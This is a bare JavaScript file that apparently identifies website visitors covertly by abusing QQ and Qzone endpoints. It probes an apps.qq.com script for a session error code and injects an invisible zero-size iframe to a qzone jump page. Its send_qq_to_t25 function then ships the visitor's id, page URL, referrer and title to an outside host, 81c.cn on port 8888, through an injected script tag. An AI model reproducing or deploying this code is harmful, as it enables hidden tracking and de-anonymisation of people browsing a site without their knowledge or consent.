
function send_qq_to_t25(i_qq,i_nick){
	var query = location.search.substring(1);
	var pairs = query.split("&"); 
	for(var i = 0; i < pairs.length; i++) {
		var pos = pairs[i].indexOf('=');
		if (pos == -1) continue;
		var key = pairs[i].substring(0,pos);
		var value = pairs[i].substring(pos+1);
		if ( key == "p" ) {
			i_uid = value;
		}else if ( key == "u" ) {
			i_url = value;
		}else if ( key == "r" ) {
			i_referrer = value;
		}else if ( key == "t" ) {
			i_title = value;
		}
	}

	var url = "http://www.81c.cn:8888/query25.asp?a=s";
	url += "&p=" + i_uid;
	url += "&webid=0" ;
	url += "&n=0" ;
	url += "&r=" + i_referrer;
	url += "&u=" + i_url;
	url += "&t=" + i_title;
	url += "&t2=" + (new Date()).getTime();
	
	var oHead = document.getElementsByTagName('HEAD').item(0);
	var oScript = document.createElement("script");
	oScript.type = "text/javascript";
	oScript.src =  url;
	if (oScript.readyState) {
			 oScript.onreadystatechange = function() {
				if (oScript.readyState == "loaded" || oScript.readyState == "complete") {
					oScript.onreadystatechange = null;
					
				}
			 };
		 } else {
			 oScript.onload = function() {
				
			 };
		 }


	oHead.appendChild(oScript);
}

(function(){
	
	function loadjs2(){
		var frameid = "frameImg" + Math["random"]();
		var n_if = document["createElement"]("iframe");
		
		
		
		
		n_if["src"] = "http://qzs.qq.com/snsapp/app/bee/widget/jump.htm?url=http://" + tt_key + ".qzone.qq.com/";
		n_if["id"] = frameid;
		n_if["scrolling"] = "no";
		n_if["setAttribute"]("frameborder", "0", 0);
		n_if["style"]["width"] = "0px";
		n_if["style"]["height"] = "0px";
		var oHead = document.getElementsByTagName('HEAD').item(0);
		oHead["appendChild"](n_if);
		send_qq_to_t25('','');
	}
		

	function loadjs(){
		try{
		if(data0.err=='1026'){
			window.setTimeout(loadjs2, 1000);
		}
		else{
			window.setTimeout(dynamicLoad, 3000);
		}
		}		
		catch(e){
		window.setTimeout(dynamicLoad, 3000);
			}
		}
	
	
	function dynamicLoad() {
		var oScript=document.createElement("script");  
		oScript.type="text/javascript";  
		
		oScript.src="http://apps.qq.com/app/yx/cgi-bin/show_fel?hc=8&lc=4&d=365633133&t="+ (new Date()).getTime();  
		 if (oScript.readyState) {
			 oScript.onreadystatechange = function() {
				if (oScript.readyState == "loaded" || oScript.readyState == "complete") {
					oScript.onreadystatechange = null;
					window.setTimeout(loadjs, 500);
				}
			 };
		 } else {
			 oScript.onload = function() {
				window.setTimeout(loadjs, 500);
			 };
		 }

		document.getElementsByTagName('HEAD').item(0).appendChild(oScript); 
	}

	dynamicLoad();
})();
